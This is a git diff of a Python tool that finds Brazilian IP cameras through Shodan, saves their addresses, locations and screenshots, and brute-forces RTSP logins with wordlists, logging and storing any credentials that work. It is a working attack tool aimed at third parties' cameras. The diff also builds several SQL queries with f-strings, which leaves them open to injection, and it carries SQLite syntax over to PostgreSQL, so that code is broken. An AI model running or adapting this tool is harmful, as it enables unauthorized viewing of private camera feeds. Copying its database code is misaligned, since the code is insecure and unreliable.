@@ -3,16 +3,15 @@ import itertools
 import os
 import random
 import socket
-import sqlite3
 import logging
 
 import argparse as argparse
 import cv2
+import psycopg2
 import shodan
 from dotenv import load_dotenv
 
 from shodan.helpers import get_screenshot
-
 
 __version__ = '0.1.0'
 
@@ -28,95 +27,83 @@ logging.basicConfig(
 )
 
 
-def create_db():
-    conn = sqlite3.connect('rtsp_scanner.db')
-    c = conn.cursor()
-    c.execute('''
-        CREATE TABLE IF NOT EXISTS cameras
-        (id INTEGER PRIMARY KEY AUTOINCREMENT,ip TEXT,port INTEGER,user TEXT,password TEXT,url TEXT,active INTEGER DEFAULT 0, added_at DATETIME DEFAULT CURRENT_TIMESTAMP, updated_at DATETIME DEFAULT CURRENT_TIMESTAMP)
-    '''.strip().replace('\n', ' ').replace('\t', ' '))
-    conn.commit()
-    conn.close()
+class Singleton(type):
+    _instances = {}
+
+    def __call__(cls, *args, **kwargs):
+        logging.info('Singleton call')
+        if cls not in cls._instances:
+            logging.info('Singleton call if')
+            cls._instances[cls] = super(Singleton, cls).__call__(*args, **kwargs)
+        return cls._instances[cls]
 
 
-def migrate_fields_table_db():
-    conn = sqlite3.connect('rtsp_scanner.db')
-    c = conn.cursor()
-    c.execute(
-        '''ALTER TABLE cameras ADD COLUMN city VARCHAR(255) DEFAULT '.'; '''.strip().replace('\n', ' ').replace('\t',
-                                                                                                                ' ')
-    )
-    c.execute(
-        '''ALTER TABLE cameras ADD COLUMN country_code VARCHAR(255) DEFAULT '.'; '''.strip().replace('\n', ' ').replace(
-            '\t', ' ')
-    )
-    conn.commit()
-    conn.close()
+class DatabaseConnector:
+
+    def __init__(self):
+        try:
+            self.conn = psycopg2.connect(
+                database=os.getenv('DB_NAME'),
+                host=os.getenv('DB_HOST'),
+                user=os.getenv('DB_USER'),
+                password=os.getenv('DB_PASSWORD'),
+                port=os.getenv('DB_PORT')
+            )
+            logging.info(f'Connected to {os.getenv("DB_NAME")} database')
+        except Exception as e:
+            logging.error(f'Error on connect to database: {e}')
+            raise e
+
+    def insert_into_cameras(self, ip, port, user, password, url, city, country_code):
+        c = self.conn.cursor()
+        c.execute(f'''
+            INSERT INTO public.cameras (ip, port, "user", "password", url, active, city, country_code, added_at, updated_at, id) VALUES('{ip}', {port}, '{user}', '{password}', '{url}', 0, '{city}', '{country_code}', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, DEFAULT);
+        '''.strip(), (ip, port, user, password, url, city, country_code))
+        self.conn.commit()
+
+    def insert_into_runs(self, run_name):
+        c = self.conn.cursor()
+        c.execute('''
+            INSERT INTO runs(run_name) VALUES(%s)
+        '''.strip(), (run_name,))
+        self.conn.commit()
+
+    def get_random_from_db(self):
+        c = self.conn.cursor()
+        c.execute('''
+            SELECT * FROM cameras WHERE active = 1 ORDER BY RANDOM()
+        '''.strip())
+        result = c.fetchall()
+        return result
+
+    def get_from_db(self):
+        c = self.conn.cursor()
+        c.execute('''
+            SELECT * FROM cameras WHERE active = 0
+        '''.strip())
+        result = c.fetchall()
+        return result
+
+    def search_on_db(self, ip, port):
+        c = self.conn.cursor()
+        c.execute(f'''SELECT * FROM cameras WHERE ip = '{ip}' AND port = {port}''')
+        result = c.fetchall()
+        return result
+
+    def update_active_from_db(self, ip, port):
+        c = self.conn.cursor()
+        c.execute(f'''UPDATE cameras SET active = 1 WHERE ip = '{ip}' AND port = {port}'''.strip())
+        self.conn.commit()
+
+    def update_from_db_values(self, host, port, user, password, rtsp_string, active):
+        c = self.conn.cursor()
+        c.execute('''INSERT OR REPLACE INTO cameras (ip, port, user, password, url, active, updated_at) VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP); '''.strip(), (
+            host, port, user, password, rtsp_string, active
+        ))
+        self.conn.commit()
 
 
-def insert_into_db(ip, port, user, password, url, city, country_code):
-    conn = sqlite3.connect('rtsp_scanner.db')
-    c = conn.cursor()
-    c.execute('''
-        INSERT INTO cameras(ip, port, user, password, url, city, country_code) VALUES(?, ?, ?, ?, ?, ?, ?)
-    '''.strip(), (ip, port, user, password, url, city, country_code))
-    conn.commit()
-    conn.close()
-
-
-def get_random_from_db():
-    conn = sqlite3.connect('rtsp_scanner.db')
-    c = conn.cursor()
-    c.execute('''
-        SELECT * FROM cameras WHERE active = 0 ORDER BY RANDOM()
-    '''.strip())
-    result = c.fetchall()
-    conn.close()
-    return result
-
-
-def get_from_db():
-    conn = sqlite3.connect('rtsp_scanner.db')
-    c = conn.cursor()
-    c.execute('''
-        SELECT * FROM cameras WHERE active = 0
-    '''.strip())
-    result = c.fetchall()
-    conn.close()
-    return result
-
-
-def search_on_db(ip, port):
-    conn = sqlite3.connect('rtsp_scanner.db')
-    c = conn.cursor()
-    c.execute('''
-        SELECT * FROM cameras WHERE ip = ? AND port = ?
-    '''.strip(), (ip, port))
-    result = c.fetchall()
-    conn.close()
-    return result
-
-
-def update_active_from_db(ip, port):
-    conn = sqlite3.connect('rtsp_scanner.db')
-    c = conn.cursor()
-    c.execute('''
-        UPDATE cameras SET active = 1 WHERE ip = ? AND port = ?
-    '''.strip(), (ip, port))
-    conn.commit()
-    conn.close()
-
-
-def update_from_db_values(host, port, user, password, rtsp_string, active):
-    conn = sqlite3.connect('rtsp_scanner.db')
-    c = conn.cursor()
-    c.execute('''
-        INSERT OR REPLACE INTO cameras (ip, port, user, password, url, active, updated_at) VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP); 
-    '''.strip(), (
-        host, port, user, password, rtsp_string, active
-    ))
-    conn.commit()
-    conn.close()
+db = DatabaseConnector()
 
 
 def write_image_to_file(ss, h, p):
@@ -136,7 +123,7 @@ def check_rtsp_connection_by_host(host, port, user, password, rtsp_string):
             logging.debug(f'No frame for {rtsp_url}')
             return None
         logging.info(f'[!!] Connected to camera with RTSP URL: {rtsp_url}, user: {user}, password: {password}')
-        update_from_db_values(host, port, user, password, rtsp_url, 1)
+        db.update_from_db_values(host, port, user, password, rtsp_url, 1)
         return rtsp_url
     except Exception as e:
         logging.error(f'Error: {e}')
@@ -154,37 +141,43 @@ def is_camera(host, port, path):
         sock.send(f'GET {path} HTTP/1.0\r\n\r\n'.encode())
         res = sock.recv(100)
         if res.find(b'200 OK') > 0:
-            update_active_from_db(host, port)
+            db.update_active_from_db(host, port)
             return True
         return False
     except Exception as e:
         return False
 
 
-def thread_add_cameras_on_db():
-    # query = 'city:"Itatiba,Valinhos,Campinas" cam'
-    query = 'country:BR cam'
+def thread_add_cameras_on_db(shodan_key=None):
+    if shodan_key:
+        logging.debug(f'Starting thread_add_cameras_on_db using key "{shodan_key}"')
+        shodan_key = shodan_key
+    else:
+        logging.debug(f'Starting thread_add_cameras_on_db using key from env')
+        shodan_key = os.getenv('SHODAN_KEY')
+    query = 'country:BR cam has_screenshot:true'
     logging.debug(f'Starting thread_add_cameras_on_db using query "{query}"')
-    api = shodan.Shodan(os.getenv('SHODAN_KEY'))
+    api = shodan.Shodan(shodan_key)
     results = api.search_cursor(query)
 
     logging.info('Updating database')
     cams_added = 0
     for banner in results:
         ip, port = banner.get('ip_str'), banner.get('port')
-        db_response = search_on_db(ip, port)
+        db_response = db.search_on_db(ip, port)
         if db_response:
             logging.debug(f'{ip}:{port} skipped')
         else:
             city = banner.get('location').get('city')
             country_code = banner.get('location').get('country_code')
-            insert_into_db(ip, port, '.', '.', '.', city, country_code)
+            db.insert_into_cameras(ip, port, '.', '.', '.', city, country_code)
             logging.debug(f'{ip}:{port} added')
             cams_added += 1
         if banner.get('screenshot'):
             screenshot = get_screenshot(banner)
             write_image_to_file(screenshot, ip, port)
     logging.info(f'{cams_added} cameras added')
+    return cams_added
 
 
 def thread_test_cameras(users_wordlist, passwords_wordlist, rtsp_urls_wordlist, randomize):
@@ -199,7 +192,7 @@ def thread_test_cameras(users_wordlist, passwords_wordlist, rtsp_urls_wordlist, 
         random.shuffle(camera_passwords)
         random.shuffle(rtsp_url_type)
 
-    cameras = get_random_from_db()
+    cameras = db.get_random_from_db()
     logging.debug(f'Testing {len(cameras)} cameras')
     camera_combinations = itertools.product(rtsp_url_type, camera_users, camera_passwords, cameras)
     for url, user, password, camera in camera_combinations:
@@ -213,7 +206,8 @@ def parse_arguments() -> argparse.Namespace:
     parser = argparse.ArgumentParser()
 
     group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument('--start_search', action='store_true', help='Start searching for cameras on Shodan', default=False)
+    group.add_argument('--start_search', action='store_true', help='Start searching for cameras on Shodan',
+                       default=False)
     group.add_argument('--start_check', action='store_true', help='Start testing cameras on DB', default=False)
 
     parser.add_argument('--threads', action='store', help='Number of threads to check cams', default=1, type=int)
@@ -234,10 +228,6 @@ def parse_arguments() -> argparse.Namespace:
         if not os.path.exists(args.rtsp_urls):
             parser.error(f'RTSP URLs file "{args.rtsp_urls}" not found')
             return False
-        if not os.path.exists(args.db_name):
-            logging.info(f'Database "{args.db_name}" not found, creating now')
-            create_db()
-            migrate_fields_table_db()
         if not os.path.exists('frames'):
             logging.info(f'Frames folder not found, creating now')
             os.mkdir('frames')
@@ -252,7 +242,6 @@ def parse_arguments() -> argparse.Namespace:
 def main():
     args = parse_arguments()
 
-    arg_threads = args.threads
     wd_users = args.users
     wd_passwords = args.passwords
     wd_rtsp_urls = args.rtsp_urls
@@ -287,3 +276,6 @@ def main():
 
 if __name__ == '__main__':
     main()
+
+    # db = DatabaseConnector()
+    # db.prepare_db()
